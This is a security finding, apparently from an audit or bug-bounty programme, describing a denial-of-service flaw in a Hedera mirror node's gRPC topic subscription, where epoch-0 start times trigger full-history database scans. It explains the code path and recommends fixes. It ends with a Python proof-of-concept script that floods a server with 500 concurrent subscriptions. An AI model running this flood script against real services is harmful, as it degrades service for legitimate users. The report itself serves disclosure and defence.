### Title
Unprivileged User Can Trigger Full Historical Table Scan via Epoch-0 `startTime` in `PollingTopicMessageRetriever.poll()`

### Summary
Any unauthenticated gRPC client can set `consensusStartTime = {seconds: 0}` in a `ConsensusTopicQuery`, which passes all validation and causes `PollingTopicMessageRetriever.poll()` to begin paginating the entire `topic_message` table from timestamp 0. With `throttled=true` and `numRepeats = Long.MAX_VALUE`, the retriever issues repeated DB queries until the full historical dataset is exhausted or the 60-second timeout fires. Many concurrent such connections can saturate database I/O and constitute a non-network DoS.

### Finding Description

**Entry point — `ConsensusController.toFilter()`:** [1](#0-0) 

If the client sends `consensusStartTime = Timestamp{seconds=0, nanos=0}`, `hasConsensusStartTime()` returns `true` and `convertTimestamp()` returns `0L`. `filter.startTime(0)` is set with no further restriction.

**Validation in `TopicMessageFilter` — both constraints pass for `startTime=0`:** [2](#0-1) 

- `@Min(0)` explicitly permits `0`.
- `isValidStartTime()` checks `startTime <= DomainUtils.now()`, which is always true for `0`.

**`poll()` uses the raw `filter.getStartTime()` on the first invocation:** [3](#0-2) 

When `last == null` (first poll), `startTime = 0`. The generated JPA query becomes:
```sql
SELECT * FROM topic_message
WHERE topic_id = ? AND consensus_timestamp >= 0
ORDER BY consensus_timestamp
LIMIT 1000
```
This is an index scan on `(topic_id, consensus_timestamp)` starting at the very first row ever inserted. [4](#0-3) 

**Clarification on "every poll cycle":** After the first page, `last` is set and `startTime` advances to `last.getConsensusTimestamp() + 1`. Subsequent polls do not re-scan from epoch 0. However, the retriever paginates through the *entire* historical dataset from epoch 0 until `isComplete()` returns true.

**`isComplete()` for `throttled=true` never fires until the last page is smaller than `maxPageSize`:** [5](#0-4) 

With `numRepeats = Long.MAX_VALUE` and `pollingFrequency = 2s`, a single connection issues up to ~30 queries (bounded by the 60-second timeout), each fetching 1000 rows, before terminating. [6](#0-5) 

**No rate limiting or connection cap is present** in `ConsensusController`, `TopicMessageServiceImpl`, or `PollingTopicMessageRetriever`.

### Impact Explanation
On a production mirror node with years of HCS history (potentially hundreds of millions of rows), each connection with `startTime=0` forces the DB to stream the full historical dataset for the requested topic in 1000-row pages. With N concurrent attackers, the DB handles N simultaneous full-history scans. Even with the index on `(topic_id, consensus_timestamp)`, the I/O volume (row reads, buffer pool pressure, network transfer to the JVM) scales linearly with concurrent connections. This can exhaust DB I/O, degrade or deny service to legitimate subscribers, and cause the mirror node's gRPC service to become unresponsive — a non-network DoS.

### Likelihood Explanation
The attack requires zero privileges: any gRPC client can send a `ConsensusTopicQuery` with `consensusStartTime = Timestamp{seconds=0}`. The protobuf field is publicly documented. The attack is trivially scriptable (open N connections in a loop), repeatable, and requires no special knowledge beyond the public API schema. The 60-second timeout limits each connection but does not prevent sustained parallel abuse.

### Recommendation
1. **Enforce a minimum `startTime` floor** in `ConsensusController.toFilter()` or `TopicMessageFilter.isValidStartTime()`: reject or clamp `startTime` values older than a configurable maximum lookback window (e.g., 90 days).
2. **Add per-IP or per-client connection rate limiting** at the gRPC layer.
3. **Cap concurrent subscriber count** per topic or globally, returning `RESOURCE_EXHAUSTED` when the limit is exceeded.
4. **Require a `limit` when `startTime` is far in the past**, preventing open-ended historical scans.

### Proof of Concept
```python
import grpc
from hedera.mirror.api.proto import consensus_service_pb2, consensus_service_pb2_grpc
from proto.services import basic_types_pb2, timestamp_pb2
import threading

def flood(i):
    channel = grpc.insecure_channel("mirror-node-grpc:5600")
    stub = consensus_service_pb2_grpc.ConsensusServiceStub(channel)
    query = consensus_service_pb2.ConsensusTopicQuery(
        topicID=basic_types_pb2.TopicID(topicNum=1234),
        consensusStartTime=timestamp_pb2.Timestamp(seconds=0, nanos=0),
        # no limit — open-ended scan from epoch 0
    )
    try:
        for _ in stub.subscribeTopic(query):
            pass  # drain responses, keeping DB busy
    except Exception:
        pass

# Launch 500 concurrent connections, each scanning from epoch 0
threads = [threading.Thread(target=flood, args=(i,)) for i in range(500)]
for t in threads: t.start()
for t in threads: t.join()
```

Each connection causes `PollingTopicMessageRetriever.poll()` to issue repeated `SELECT … WHERE consensus_timestamp >= 0 LIMIT 1000` queries against the full topic history. 500 concurrent connections × ~30 polls × 1000 rows = 15,000,000 rows read per 60-second window, saturating DB I/O.
